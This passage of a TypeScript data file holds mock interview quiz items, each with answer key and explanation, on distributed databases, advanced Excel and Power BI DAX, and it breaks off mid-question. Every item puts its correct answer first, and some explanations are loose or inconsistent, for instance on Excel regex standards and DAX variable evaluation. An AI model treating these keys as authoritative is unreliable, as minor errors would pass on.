import { FaangMockTest, FaangQuestion } from '../types';

// ============================================================================
// 1. DBMS & DISTRIBUTED SQL ARCHITECTURE (TIER-2 / ADVANCED) (10 MCQs)
// Distributed Transactions, 2PC, Jepsen Linearizability, LSM Trees, Raft & Query Optimization
// ============================================================================
export const DBMS_TIER2_QUESTIONS: FaangQuestion[] = [
  {
    id: 'dbms2-q1',
    testId: 'mock-dbms-sql-tier2',
    section: 'Distributed Database Systems',
    companyTag: 'Google Spanner / CockroachDB Core',
    question: 'In distributed database systems (e.g., Google Spanner, CockroachDB), how does Two-Phase Commit (2PC) handle coordinator failure during the commit phase, and how is blocking resolved?',
    options: [
      'Standard 2PC is fundamentally blocking if the coordinator crashes after participants vote YES; modern systems resolve this by replicating the coordinator and transaction state machine via Raft or Paxos consensus',
      '2PC never blocks because participants automatically abort if they do not receive a commit message within 5 milliseconds',
      'Participants independently decide to commit without waiting for the coordinator by querying other database nodes via broadcast UDP',
      'The operating system kernel automatically rolls back all distributed locks when the coordinator process terminates'
    ],
    correctIndex: 0,
    explanation: 'In classic 2PC, if all participants vote YES (prepared state) and the coordinator crashes before sending COMMIT/ABORT, participants are stuck holding locks indefinitely (blocking property). Distributed databases eliminate this single point of failure by running the coordinator and transaction participants on top of replicated Paxos/Raft consensus groups, ensuring seamless leader failover without blocking transactions.',
    shortcutOrInsight: 'Consensus + 2PC: Paxos/Raft provides high availability for each partition; 2PC coordinates atomic commit across different consensus groups.',
    difficulty: 'Very Hard'
  },
  {
    id: 'dbms2-q2',
    testId: 'mock-dbms-sql-tier2',
    section: 'Storage Engines',
    companyTag: 'Meta RocksDB / Apache Cassandra Team',
    question: 'Why do write-heavy databases (such as RocksDB, Cassandra, and ClickHouse) employ Log-Structured Merge (LSM) Trees instead of traditional B+ Trees for primary data storage?',
    options: [
      'LSM Trees convert random disk writes into sequential disk writes by buffering mutations in an in-memory MemTable before appending to immutable SSTables, vastly reducing write amplification',
      'LSM Trees store all data permanently in CPU L1 cache, eliminating disk access entirely',
      'B+ Trees cannot handle binary string keys or UTF-8 encodings',
      'LSM Trees provide O(1) point reads without requiring Bloom filters'
    ],
    correctIndex: 0,
    explanation: 'B+ Trees perform in-place updates, converting concurrent writes into random disk I/O, which is slow on rotational media and causes severe write amplification on SSDs. LSM Trees buffer all writes in RAM (MemTable + WAL) and periodically flush them sequentially to disk as immutable Sorted String Tables (SSTables). Compaction merges SSTables in the background, utilizing Bloom filters to speed up point lookups.',
    shortcutOrInsight: 'Write throughput trade-off: LSM Trees optimize for write throughput via sequential I/O, trading off read latency (mitigated by Bloom filters and Leveled Compaction).',
    difficulty: 'Hard'
  },
  {
    id: 'dbms2-q3',
    testId: 'mock-dbms-sql-tier2',
    section: 'Query Optimization & Relational Algebra',
    companyTag: 'Snowflake / Databricks Engine',
    question: 'When an RDBMS query optimizer chooses between a "Nested Loop Join", a "Sort-Merge Join", and a "Grace Hash Join", under which scenario is Grace Hash Join mathematically optimal?',
    options: [
      'Joining two massive unindexed tables that do not fit in available memory, where an equi-join condition (=) is evaluated and input data is not pre-sorted',
      'Joining two tables with a non-equi condition such as `A.val BETWEEN B.low AND B.high`',
      'Joining a 5-row lookup table with a table having a clustered index on the join key',
      'Joining two tables where both tables are already physically sorted on the join key'
    ],
    correctIndex: 0,
    explanation: 'Grace Hash Join partitions both relations into hash buckets using a hash function on the join key. If a partition exceeds memory, it recursively partitions it to disk. It operates strictly on equi-joins (=) and achieves O(M + N) I/O complexity. For pre-sorted inputs, Sort-Merge Join is chosen; for tiny outer tables with indexed inner tables, Index Nested Loop Join is chosen.',
    shortcutOrInsight: 'Join Selection: Equi-join on huge unsorted data -> Hash Join; Sorted or range data -> Merge Join; Small outer with index -> Nested Loop Join.',
    difficulty: 'Hard'
  },
  {
    id: 'dbms2-q4',
    testId: 'mock-dbms-sql-tier2',
    section: 'Distributed Consistency',
    companyTag: 'Amazon DynamoDB / AWS Aurora',
    question: 'Under the CAP and PACELC theorems, how is Amazon Aurora classified during a network partition (P) and under normal operation (E - Else)?',
    options: [
      'PC/EC (Aurora favors Consistency over Availability during partitions via a 4-of-6 quorum, and favors Consistency over Latency during normal operations)',
      'PA/EL (Aurora always sacrifices consistency for zero latency)',
      'PC/EL (Aurora favors Consistency during partition, but Latency during normal operation)',
      'Aurora bypasses CAP entirely by utilizing quantum entanglement clocks'
    ],
    correctIndex: 0,
    explanation: 'The PACELC theorem states: If there is a Partition (P), how does the system trade Availability (A) vs Consistency (C)? Else (E), when the system is normal, how does it trade Latency (L) vs Consistency (C)? Aurora uses 6 storage replicas across 3 Availability Zones with a 4-of-6 write quorum and 3-of-6 read quorum. It enforces strong consistency in both scenarios (PC/EC).',
    shortcutOrInsight: 'PACELC mnemonic: If P: (A or C), Else: (L or C). Strict ACID enterprise systems prioritize C in both cases.',
    difficulty: 'Very Hard'
  },
  {
    id: 'dbms2-q5',
    testId: 'mock-dbms-sql-tier2',
    section: 'Transaction Processing Internals',
    companyTag: 'PostgreSQL Core Dev Team',
    question: 'In PostgreSQL MVCC implementation, what is the purpose of the `VACUUM` process and what catastrophic condition occurs if transaction ID wraparound is not mitigated?',
    options: [
      'VACUUM cleans dead tuple versions created by UPDATEs and DELETEs; without regular vacuuming, 32-bit transaction IDs (XIDs) wrap around after 2^31 transactions, causing past data to suddenly appear in the future and become invisible',
      'VACUUM compresses all table rows into ZIP files to save RAM',
      'VACUUM converts the database from relational tables into a NoSQL document store',
      'Transaction ID wraparound causes the database to permanently change all primary keys to negative numbers'
    ],
    correctIndex: 0,
    explanation: 'Postgres represents transaction IDs using 32-bit integers, comparing IDs modulo 2^32. If a database reaches 2.1 billion transactions without freezing old tuples, transaction ID wraparound occurs, causing old committed tuples to appear as being in the future, rendering them invisible. `VACUUM FREEZE` marks ancient rows as FrozenXID so they are universally visible to all transactions.',
    shortcutOrInsight: 'XID Wraparound: PostgreSQL 32-bit transaction counter requires periodic autovacuum freeze to prevent catastrophic data invisibility.',
    difficulty: 'Very Hard'
  },
  {
    id: 'dbms2-q6',
    testId: 'mock-dbms-sql-tier2',
    section: 'Advanced SQL Execution',
    companyTag: 'Uber Data Engineering OA',
    question: 'Which SQL window construct calculates the 30-day trailing rolling average of revenue for each account, accounting for days with zero transactions without skipping calendar days?',
    options: [
      'Generate a continuous date spine via `GENERATE_SERIES()` / Recursive CTE, LEFT JOIN transactions, and use `AVG(revenue) OVER (PARTITION BY account_id ORDER BY trans_date RANGE BETWEEN INTERVAL \'29 days\' PRECEDING AND CURRENT ROW)`',
      'Use `AVG(revenue) OVER (PARTITION BY account_id ORDER BY trans_date ROWS BETWEEN 29 PRECEDING AND CURRENT ROW)` directly on the sparse transaction table',
      'Use `DENSE_RANK() OVER (ORDER BY revenue DESC)` grouped by 30-day buckets',
      'Use `CUME_DIST() OVER (PARTITION BY 30)`'
    ],
    correctIndex: 0,
    explanation: '`ROWS BETWEEN 29 PRECEDING` counts the preceding 29 rows of transactions, NOT 29 calendar days! If an account had only 1 transaction per month, 29 rows would span 2.5 years. To compute true calendar rolling windows on sparse data, you must either join against a continuous date spine or use `RANGE BETWEEN INTERVAL \'29 days\' PRECEDING AND CURRENT ROW` on timestamps.',
    shortcutOrInsight: 'ROWS vs RANGE: `ROWS` counts physical record rows; `RANGE` evaluates offsets on values/dates.',
    difficulty: 'Hard'
  },
  {
    id: 'dbms2-q7',
    testId: 'mock-dbms-sql-tier2',
    section: 'Database Sharding & Partitioning',
    companyTag: 'Stripe Payment Sharding Infrastructure',
    question: 'When migrating from a single PostgreSQL instance to a horizontally sharded architecture using Consistent Hashing with Virtual Nodes (vnodes), what is the key advantage of vnodes?',
    options: [
      'They prevent non-uniform data distribution (hotspots) across physical servers by mapping each physical machine to multiple distinct points on the hash ring',
      'They eliminate the need for primary keys across all tables',
      'They make distributed cross-shard joins execute in O(1) time without network transfer',
      'They force all database writes to execute exclusively on a single primary coordinator'
    ],
    correctIndex: 0,
    explanation: 'In basic consistent hashing with N physical nodes, random hash dispersion can lead to uneven balance. Virtual nodes (e.g., 256 vnodes per physical server) interleave hash ranges evenly across the ring, ensuring uniform partition distribution and allowing servers with higher hardware specs to host proportionately more vnodes.',
    shortcutOrInsight: 'Consistent Hashing with Vnodes: Smooths load distribution across physical machines and ensures incremental rebalancing with only K/N key transfers upon node addition.',
    difficulty: 'Hard'
  },
  {
    id: 'dbms2-q8',
    testId: 'mock-dbms-sql-tier2',
    section: 'Index Data Structures',
    companyTag: 'MongoDB / Elasticsearch Search Core',
    question: 'How does an Inverted Index differ from a Forward Index, and why is an Inverted Index indispensable for full-text search engines?',
    options: [
      'A Forward Index maps Document -> Words; an Inverted Index maps Words -> List of Documents (Posting List), allowing instantaneous boolean term intersection without scanning documents',
      'An Inverted Index stores records in reverse alphabetical order on tape drives',
      'An Inverted Index stores data in memory while Forward Indices store data on floppy disks',
      'A Forward Index can only search for numeric integers'
    ],
    correctIndex: 0,
    explanation: 'A Forward Index maintains a document-to-term mapping (Doc 1: [cat, dog]). Searching for "dog" would require scanning every single document. An Inverted Index maps each distinct term to its posting list of document IDs (cat: [Doc 1, Doc 4]; dog: [Doc 1, Doc 2]). Finding documents containing both "cat" AND "dog" reduces to intersecting two sorted integer lists in O(len1 + len2) time.',
    shortcutOrInsight: 'Inverted Index: Term -> Sorted Postings List. Enables lightning fast boolean query intersections via skip-pointers.',
    difficulty: 'Medium'
  },
  {
    id: 'dbms2-q9',
    testId: 'mock-dbms-sql-tier2',
    section: 'Locking & Concurrency Internals',
    companyTag: 'Oracle Database Engineering',
    question: 'What is the purpose of Intent Locks (e.g., Intent Shared `IS`, Intent Exclusive `IX`) in hierarchical multi-granularity locking (Database -> Table -> Page -> Row)?',
    options: [
      'They allow transactions to lock coarse-grained objects (like a whole table) without traversing every child row to check for conflicting individual row locks',
      'They allow write transactions to bypass security authentication checks',
      'They guarantee that no transaction can ever wait in a lock queue for longer than 1 second',
      'They are only used when backing up the database to external cloud storage'
    ],
    correctIndex: 0,
    explanation: 'Before acquiring a Shared (S) or Exclusive (X) lock on a row, a transaction MUST acquire an Intent Shared (IS) or Intent Exclusive (IX) lock on all ancestor containers (Page, Table). If another transaction requests an Exclusive lock on the whole table, it only checks the table-level lock flags. Seeing an IX lock immediately signals that descendant rows are locked, preventing costly scans.',
    shortcutOrInsight: 'Intent Locking: Intention locks on higher containers prevent full-tree traversals when requesting coarse locks.',
    difficulty: 'Hard'
  },
  {
    id: 'dbms2-q10',
    testId: 'mock-dbms-sql-tier2',
    section: 'Distributed Consensus',
    companyTag: 'HashiCorp Raft / Kubernetes etcd',
    question: 'In the Raft consensus algorithm, what ensures that the leader will never overwrite or truncate its own log entries?',
    options: [
      'The Leader Append-Only Invariant: A Raft leader never truncates or overwrites its own log entries; it only appends new entries to its log',
      'Followers cast veto votes that immediately reboot the leader server',
      'Log entries are signed with immutable blockchain smart contracts',
      'Leaders are elected for a permanent lifetime of 10 years'
    ],
    correctIndex: 0,
    explanation: 'Raft safety properties include the "Leader Append-Only" invariant: a leader never overwrites or truncates its own log entries, only appending new ones. If followers have conflicting entries due to split-brain network partitions, the leader forces followers to overwrite their divergent entries with the leader\'s entries once quorum consensus is established.',
    shortcutOrInsight: 'Raft Log Matching Property: If two logs contain an entry with the same index and term, they are identical in all entries up through the given index.',
    difficulty: 'Very Hard'
  }
];

// ============================================================================
// 2. ADVANCED EXCEL & FINANCIAL QUANTITATIVE ENGINEERING (TIER-2) (10 MCQs)
// Monte Carlo, Power Query M-Code, Custom Lambdas, Dynamic DCF & Sensitivity Tables
// ============================================================================
export const EXCEL_TIER2_QUESTIONS: FaangQuestion[] = [
  {
    id: 'excel2-q1',
    testId: 'mock-excel-analytics-tier2',
    section: 'Financial Engineering & Monte Carlo',
    companyTag: 'Goldman Sachs Investment Banking Modeling',
    question: 'To perform a 5,000-trial Monte Carlo simulation in Excel 365 modeling log-normal stock price distributions with drift μ and volatility σ, which formula structure generates normally distributed returns from uniform pseudo-random variables?',
    options: [
      '`=NORM.INV(RAND(), Mean, StDev)` leveraging the Box-Muller / Inverse Transform method',
      '`=LOGNORM.DIST(RAND(), 0, 1, FALSE)`',
      '`=RANDBETWEEN(-StDev, StDev) * Mean`',
      '`=STDEV.P(RANDARRAY(5000, 1))`'
    ],
    correctIndex: 0,
    explanation: 'The inverse transform sampling theorem states that if U ~ Uniform(0,1), then X = F^-1(U) has distribution function F. `RAND()` produces standard uniform random numbers between 0 and 1. `NORM.INV(probability, mean, stdev)` computes the inverse cumulative normal distribution, transforming the uniform numbers into normally distributed random variables.',
    shortcutOrInsight: 'Monte Carlo Invariant: `=NORM.INV(RAND(), mu, sigma)` produces exact Gaussian shocks for continuous stochastic simulations.',
    difficulty: 'Hard'
  },
  {
    id: 'excel2-q2',
    testId: 'mock-excel-analytics-tier2',
    section: 'Power Query M-Code Architecture',
    companyTag: 'McKinsey & Company Analytics Lead',
    question: 'In Power Query M-code, what is the fundamental difference between `Table.Buffer()` and `Table.SelectRows()` regarding query evaluation and memory consumption?',
    options: [
      '`Table.Buffer()` isolates a table in memory, preventing downstream steps from re-evaluating the upstream transformation multiple times, but breaks Query Folding pushdown to SQL databases',
      '`Table.Buffer()` permanently writes the table to disk in CSV format',
      '`Table.SelectRows()` is an irreversible operation that permanently deletes rows from the source database',
      '`Table.Buffer()` can only hold a maximum of 255 rows in memory'
    ],
    correctIndex: 0,
    explanation: 'Power Query utilizes lazy evaluation. If a merged or grouped table is referenced multiple times downstream, Power Query may re-query the source data repeatedly. `Table.Buffer(SourceTable)` forces full in-memory caching of the table. However, because it materializes the data locally in RAM, it acts as a barrier that prevents Query Folding to backend SQL databases.',
    shortcutOrInsight: 'Power Query Optimization: `Table.Buffer` prevents redundant iterations of slow API calls, but disables SQL Query Folding.',
    difficulty: 'Very Hard'
  },
  {
    id: 'excel2-q3',
    testId: 'mock-excel-analytics-tier2',
    section: 'Modern LAMBDA & Recursion',
    companyTag: 'Microsoft Excel Core Engineering',
    question: 'How do you create a recursive custom Excel function using `LAMBDA()` in the Name Manager to compute the factorial of an integer N without VBA macros?',
    options: [
      'Define a named formula `MY_FACTORIAL = LAMBDA(n, IF(n<=1, 1, n * MY_FACTORIAL(n - 1)))`',
      'Excel formulas cannot be recursive; LAMBDA strictly prohibits referencing its own name',
      'Use `=RECURSE(n, n * (n-1))` in the formula bar',
      'Wrap the LAMBDA inside `=LET(f, LAMBDA(n, n!), f(n))`'
    ],
    correctIndex: 0,
    explanation: 'Excel 365 supports native recursion via LAMBDA functions defined in the Name Manager! By naming the formula `MY_FACTORIAL` and referring to `MY_FACTORIAL(n-1)` inside the conditional `IF(n<=1, 1, n * MY_FACTORIAL(n-1))`, Excel\'s calculation engine executes recursive calls up to the internal stack depth limit (~1,024 recursions).',
    shortcutOrInsight: 'Turing Completeness: `LAMBDA` with Name Manager recursion made modern Excel formulas formally Turing complete without VBA.',
    difficulty: 'Hard'
  },
  {
    id: 'excel2-q4',
    testId: 'mock-excel-analytics-tier2',
    section: 'Dynamic Array Manipulation',
    companyTag: 'Morgan Stanley Valuation Modeling',
    question: 'Which Excel 365 dynamic array function combination reshapes a single column of 100 values into a 20-row by 5-column matrix, padding missing values with `#N/A` if the input is irregular?',
    options: [
      '`=WRAPROWS(A1:A100, 5, #N/A)`',
      '`=TRANSPOSE(CHOOSECOLS(A1:A100, 5))`',
      '`=EXPAND(A1:A100, 20, 5)`',
      '`=FLATTEN(A1:A100, 5, 20)`'
    ],
    correctIndex: 0,
    explanation: '`WRAPROWS(vector, wrap_count, [pad_with])` wraps the provided 1D row or column vector into a 2D grid by row after a specified number of elements (`wrap_count = 5`). If there are fewer elements than needed to fill the final row, it fills trailing slots with the optional `pad_with` parameter.',
    shortcutOrInsight: 'Grid Reshaping: `WRAPROWS` wraps by row; `WRAPCOLS` wraps by column. Avoids complex nested INDEX/ROW/MOD math.',
    difficulty: 'Medium'
  },
  {
    id: 'excel2-q5',
    testId: 'mock-excel-analytics-tier2',
    section: 'Corporate Finance & Valuation',
    companyTag: 'JPMorgan Equity Research OA',
    question: 'In building a Discounted Cash Flow (DCF) model in Excel, why is `=XNPV(rate, values, dates)` strictly preferred over `=NPV(rate, values)` for real-world enterprise valuations?',
    options: [
      'XNPV calculates cash flow discounting on exact day-count fractions (365-day basis) with non-periodic dates, whereas standard NPV assumes cash flows occur at strictly uniform, end-of-period intervals',
      'Standard NPV cannot handle negative cash flows or initial investments',
      'XNPV is the only function that computes the internal rate of return',
      'Standard NPV requires interest rates to be entered as whole percentages rather than decimals'
    ],
    correctIndex: 0,
    explanation: '`NPV` assumes all cash flows occur at equal time intervals (e.g. exactly 365.0 days apart, at the end of each period). Real-world M&A, quarterly earnings, and transaction closings occur on irregular dates. `XNPV` takes a specific array of dates and discounts each cash flow using `(d_i - d_1) / 365`, delivering mathematically precise present values.',
    shortcutOrInsight: 'DCF Precision Rule: Always use `XNPV` and `XIRR` with specific calendar dates in corporate finance valuations.',
    difficulty: 'Medium'
  },
  {
    id: 'excel2-q6',
    testId: 'mock-excel-analytics-tier2',
    section: 'Matrix Algebra in Excel',
    companyTag: 'BlackRock Portfolio Risk Analytics',
    question: 'Given an Nx1 vector of portfolio weights `W` and an NxN asset covariance matrix `Cov`, which Excel formula calculates the total portfolio variance `W^T * Cov * W` in a single cell?',
    options: [
      '`=MMULT(MMULT(TRANSPOSE(W), Cov), W)`',
      '`=SUMPRODUCT(W, Cov, W)`',
      '`=COVARIANCE.P(W, Cov)`',
      '`=MATRIX.MULTIPLY(W, Cov)`'
    ],
    correctIndex: 0,
    explanation: 'Portfolio variance is quadratic form `w^T Σ w`. In Excel, `TRANSPOSE(W)` converts the Nx1 column into a 1xN row. The inner `MMULT(TRANSPOSE(W), Cov)` produces a 1xN vector. The outer `MMULT(..., W)` multiplies the 1xN vector by the Nx1 vector `W`, producing a 1x1 scalar variance value.',
    shortcutOrInsight: 'Matrix Math in Excel: `MMULT` takes two compatible 2D matrices. Nested `MMULT` handles multi-matrix vector products.',
    difficulty: 'Hard'
  },
  {
    id: 'excel2-q7',
    testId: 'mock-excel-analytics-tier2',
    section: 'Two-Variable Data Tables',
    companyTag: 'Deloitte Corporate Finance Advisory',
    question: 'When setting up a 2-Variable Sensitivity Data Table in Excel (e.g. varying WACC on rows and Terminal Growth Rate on columns), where must the target output formula cell be positioned relative to the table grid?',
    options: [
      'In the upper-left corner cell of the table range, at the intersection of the column input headers and row input headers',
      'In the bottom-right corner of the sensitivity table',
      'Directly above the first row of data in column B',
      'In an external hidden worksheet linked via a named range'
    ],
    correctIndex: 0,
    explanation: 'In an Excel Two-Variable Data Table, the upper-left corner cell (intersection of the row input vector along the top and column input vector down the left) MUST contain the formula or cell reference evaluating the output metric (e.g., `=Enterprise_Value`). Excel\'s simulation engine iteratively swaps the row and column inputs into the designated driving cells.',
    shortcutOrInsight: 'Data Table Anchor: Top-left cell = Formula link. Row Input Cell = top headers; Column Input Cell = left headers.',
    difficulty: 'Medium'
  },
  {
    id: 'excel2-q8',
    testId: 'mock-excel-analytics-tier2',
    section: 'Advanced Text Extraction & Regex',
    companyTag: 'Citadel Quant Operations',
    question: 'In modern Excel 365, which newly introduced function enables parsing complex text strings using POSIX-compliant Regular Expressions directly in cells without custom VBA?',
    options: [
      '`=REGEXTEST()`, `=REGEXEXTRACT()`, and `=REGEXREPLACE()`',
      '`=TEXTMATCH()`',
      '`=STRINGPARSE()`',
      '`=FIND.PATTERN()`'
    ],
    correctIndex: 0,
    explanation: 'Microsoft introduced native regex functions to Excel 365: `REGEXTEST` (returns TRUE/FALSE if pattern matches), `REGEXEXTRACT` (extracts matched substrings or capture groups), and `REGEXREPLACE` (replaces matched text using regex patterns and capture group back-references).',
    shortcutOrInsight: 'Native Regex in Excel: Eliminates messy nested MID/FIND/SEARCH string manipulation formulas.',
    difficulty: 'Medium'
  },
  {
    id: 'excel2-q9',
    testId: 'mock-excel-analytics-tier2',
    section: 'Volatile vs Non-Volatile Functions',
    companyTag: 'PwC Transaction Services',
    question: 'Why does senior financial model auditing prohibit the use of `INDIRECT()` and `OFFSET()` in enterprise workbooks with more than 50,000 formula cells?',
    options: [
      'Both functions are strictly volatile; they recalculate on EVERY single user keystroke or recalculation trigger anywhere in the workbook, causing severe calculation lag and CPU freezing',
      'They can only be used on 32-bit Windows systems',
      'They cause Excel to automatically round all decimal figures to zero decimal places',
      'They prevent users from saving workbooks in .xlsx format'
    ],
    correctIndex: 0,
    explanation: 'Volatile functions (such as `OFFSET`, `INDIRECT`, `NOW`, `TODAY`, and `RAND`) bypass Excel\'s smart dependency calculation tree. Instead of recalculating only when their precedent cells change, they recalculate on every sheet edit. Replacing `OFFSET` with non-volatile `INDEX` ranges restores high-speed calculation performance.',
    shortcutOrInsight: 'Model Auditing Invariant: Replace volatile `=OFFSET(A1, r, c)` with non-volatile `=INDEX(Range, r, c)` to prevent recalculation bottlenecks.',
    difficulty: 'Hard'
  },
  {
    id: 'excel2-q10',
    testId: 'mock-excel-analytics-tier2',
    section: 'Goal Seek & Solver Simplex LP',
    companyTag: 'Amazon Supply Chain Optimization',
    question: 'When solving a multi-warehouse freight allocation linear programming problem in Excel Solver, which condition must be met to ensure the Simplex LP engine finds the guaranteed global optimum?',
    options: [
      'All objective functions and constraint equations must be strictly linear (variables multiplied by constants and added/subtracted), with no IF, VLOOKUP, or non-linear functions in the dependency chain',
      'All variables must be negative integers',
      'The workbook must contain no more than 10 total cells',
      'Constraints must use only approximate greater-than inequalities'
    ],
    correctIndex: 0,
    explanation: 'The Simplex LP engine utilizes Dantzig\'s simplex algorithm, which requires all mathematical relationships in the target cell and constraints to be strictly linear. If formulas contain non-linear operations (such as `IF`, `MAX`, `MIN`, `VLOOKUP`, or variable multiplication `x * y`), the problem is non-convex, requiring the GRG Nonlinear or Evolutionary genetic algorithm engines instead.',
    shortcutOrInsight: 'Solver Engine Guide: Linear relationships -> Simplex LP (guaranteed global optimum); Smooth non-linear -> GRG Nonlinear; Discontinuous/Step functions -> Evolutionary.',
    difficulty: 'Hard'
  }
];

// ============================================================================
// 3. POWER BI & ENTERPRISE SEMANTIC ARCHITECTURE (TIER-2) (10 MCQs)
// Composite Models, DirectQuery, Calculation Groups, Aggregation Tables & Tabular Editor
// ============================================================================
export const POWERBI_TIER2_QUESTIONS: FaangQuestion[] = [
  {
    id: 'pbi2-q1',
    testId: 'mock-powerbi-dax-tier2',
    section: 'Tabular Modeling & Calculation Groups',
    companyTag: 'Microsoft Power BI Core Engine Team',
    question: 'What is the primary architectural purpose of "Calculation Groups" in Power BI Tabular modeling, and which DAX function references the measure currently in visual scope?',
    options: [
      'They eliminate measure explosion (e.g. creating YoY, YTD, MTD, and % Growth for 50 different base measures) by applying dynamic calculation logic using `SELECTEDMEASURE()`',
      'They group tables into separate folders in the Fields list',
      'They automatically translate English column names into Spanish and Mandarin',
      'They enforce security by masking user passwords'
    ],
    correctIndex: 0,
    explanation: 'Without Calculation Groups, 20 base measures requiring 6 time intelligence variations (YTD, MTD, YoY, YoY%, etc.) require creating 120 separate DAX measures. Calculation Groups allow creating a single "Time Intelligence" calculation group with items like "YTD" defined as `CALCULATE(SELECTEDMEASURE(), DATESYTD(\'Date\'[Date]))`, reducing 120 measures down to 20 base measures.',
    shortcutOrInsight: 'Calculation Groups: Reduces measure count from N × M down to N + M by decoupling calculation logic from specific measure expressions via `SELECTEDMEASURE()`.',
    difficulty: 'Hard'
  },
  {
    id: 'pbi2-q2',
    testId: 'mock-powerbi-dax-tier2',
    section: 'DirectQuery & Composite Models',
    companyTag: 'Amazon Enterprise BI / Redshift BI',
    question: 'In Power BI Composite Models mixing Import mode and DirectQuery mode, what is the purpose of setting dimension tables (like Date and Product) to "Dual" storage mode?',
    options: [
      'Dual mode tables act as Import mode when queried alongside Import fact tables, and act as DirectQuery when queried alongside DirectQuery fact tables, preventing expensive cross-source data movement',
      'Dual mode tables double the number of rows stored in memory',
      'Dual mode enables automatic backup to both AWS S3 and Azure Blob simultaneously',
      'Dual mode allows two different users to edit the semantic model simultaneously'
    ],
    correctIndex: 0,
    explanation: 'If a Dimension table is Import-only and queried with a DirectQuery fact table, Power Query must generate an expensive SQL query with thousands of inline values or perform the join in memory. Setting the Dimension to "Dual" mode caches data in-memory for fast Import-mode queries, while also allowing Power BI to push queries directly to the source database as native joins when paired with DirectQuery tables.',
    shortcutOrInsight: 'Dual Storage Mode: The chameleon of tabular modeling. Matches the storage mode of the interacting fact table to optimize query pushdown.',
    difficulty: 'Very Hard'
  },
  {
    id: 'pbi2-q3',
    testId: 'mock-powerbi-dax-tier2',
    section: 'Aggregation Tables & Big Data',
    companyTag: 'Snowflake / Databricks BI Engineering',
    question: 'How do "User-Defined Aggregations" in Power BI optimize query performance on petabyte-scale data warehouses (e.g., Snowflake or Google BigQuery)?',
    options: [
      'Power BI stores a pre-aggregated summary table in lightning-fast VertiPaq memory; DAX queries at summary levels hit memory in sub-seconds, while queries requiring row-level transactions seamlessly fall back to DirectQuery via query folding',
      'Aggregations compress all SQL databases down to 10 bytes using quantum bit shifting',
      'Aggregations replace all bar charts with scatter plots',
      'Aggregations force the source database to pre-calculate all possible user queries every midnight'
    ],
    correctIndex: 0,
    explanation: 'User-Defined Aggregations map a high-level in-memory aggregate table (e.g. Sales aggregated by Month and Product Category in Import mode) to a billion-row DirectQuery detail table. When users view monthly trends, Power BI intercepts the query and routes it to in-memory VertiPaq ("Agg Hit"). If the user drills down to individual invoice line items, it queries the backend database ("Agg Miss").',
    shortcutOrInsight: 'Power BI Aggregations: Best of both worlds: in-memory sub-second speed for 95% of dashboard queries, with DirectQuery drill-through to petabytes of detail data.',
    difficulty: 'Very Hard'
  },
  {
    id: 'pbi2-q4',
    testId: 'mock-powerbi-dax-tier2',
    section: 'Advanced DAX Context & Optimization',
    companyTag: 'Uber Analytics Engine',
    question: 'In DAX performance tuning, why is `VAR` evaluation evaluated lazily with constant caching, and how does this prevent performance degradation in complex measures?',
    options: [
      'DAX variables (`VAR`) are calculated once upon declaration in their defined filter context and store a static scalar or table value, preventing redundant recalculations when referenced multiple times in `RETURN`',
      'Variables make measures run asynchronously across multiple cloud regions',
      'Variables permanently convert decimal numbers into integers to conserve memory',
      'Variables bypass all row-level security filters in the report'
    ],
    correctIndex: 0,
    explanation: 'DAX variables are evaluated at the moment of their definition, within the filter context where they are declared. Once evaluated, their result is fixed as a constant value for the remainder of the measure execution. Reusing the variable multiple times in conditional statements (`IF`, `SWITCH`) references the cached result rather than triggering expensive subquery evaluations.',
    shortcutOrInsight: 'DAX Variable Invariant: `VAR` = Constant value evaluated in its definition context. Never re-evaluates inside iteration loops.',
    difficulty: 'Medium'
  },
  {
    id: 'pbi2-q5',
    testId: 'mock-powerbi-dax-tier2',
    section: 'Filter Modifiers & Shadow Filter Context',
    companyTag: 'Microsoft Tabular Engine Architects',
    question: 'What is the precise behavioral difference between `ALL(Table[Column])` and `ALLSELECTED(Table[Column])` in DAX?',
    options: [
      '`ALL()` clears all filter context on the column including explicit user slicers; `ALLSELECTED()` restores the filter context established by external visual slicers while ignoring internal visual group filters (matrix rows/columns)',
      '`ALL()` only works on text columns, while `ALLSELECTED()` only works on dates',
      '`ALLSELECTED()` deletes the column from the data model',
      '`ALL()` forces the calculation engine to evaluate using Python instead of DAX'
    ],
    correctIndex: 0,
    explanation: '`ALL(Table[Column])` strips away all filters on that column, regardless of whether they originated from report-level filters, page slicers, or the rows of a visual. `ALLSELECTED(Table[Column])` removes filters originating from inside the current visual (such as matrix row headers), but preserves slicers and filters applied by the user on the report canvas, enabling accurate "% of Total" calculations.',
    shortcutOrInsight: 'ALL vs ALLSELECTED: `ALL` = total grand population; `ALLSELECTED` = total of currently sliced selection.',
    difficulty: 'Hard'
  },
  {
    id: 'pbi2-q6',
    testId: 'mock-powerbi-dax-tier2',
    section: 'DAX Time Intelligence & Non-Standard Calendars',
    companyTag: 'Walmart Enterprise Reporting',
    question: 'Why do standard DAX time-intelligence functions like `TOTALYTD()` and `SAMEPERIODLASTYEAR()` produce incorrect results in retail organizations using a 4-4-5 or 13-period fiscal calendar, and what is the proper solution?',
    options: [
      'Built-in time intelligence functions rely strictly on standard Gregorian calendar rules (365/366 days); custom fiscal calendars require custom DAX measures filtering on custom Fiscal Year and Fiscal Period columns in a dedicated DimDate table',
      'DAX cannot process dates prior to the year 2020',
      'Retail companies cannot use Power BI due to licensing restrictions on inventory counts',
      'Standard functions only work if all months have exactly 30 days'
    ],
    correctIndex: 0,
    explanation: 'Standard DAX time-intelligence functions (`DATESYTD`, `SAMEPERIODLASTYEAR`, `DATEADD`) are hard-coded to Gregorian calendar date logic. 4-4-5 or 13-week retail calendars have varying month lengths and non-aligned week endings. Retail models must use custom DAX with `FILTER(ALL(DimDate), DimDate[FiscalYear] = ... && DimDate[FiscalWeek] <= ...)` over custom date attributes.',
    shortcutOrInsight: 'Custom Calendar Rule: Never use native DAX time intelligence on 4-4-5 / retail calendars; write explicit filter expressions against fiscal attributes.',
    difficulty: 'Hard'
  },
  {
    id: 'pbi2-q7',
    testId: 'mock-powerbi-dax-tier2',
    section: 'VertiPaq Engine Profiling',
    companyTag: 'DAX Studio / Tabular Optimization Team',
    question: 'When profiling a slow DAX measure in DAX Studio, you observe high "Formula Engine (FE)" duration with single-threaded execution, while "Storage Engine (SE)" duration is near zero. What does this indicate?',
    options: [
      'The measure relies heavily on non-vectorized row-by-row procedural operations, complex context transitions, or high-cardinality iterators that cannot be pushed down to VertiPaq SE multithreaded scans',
      'The physical SSD storage drive hosting the database is failing',
      'VertiPaq has run out of disk space',
      'The user needs to change the monitor resolution'
    ],
    correctIndex: 0,
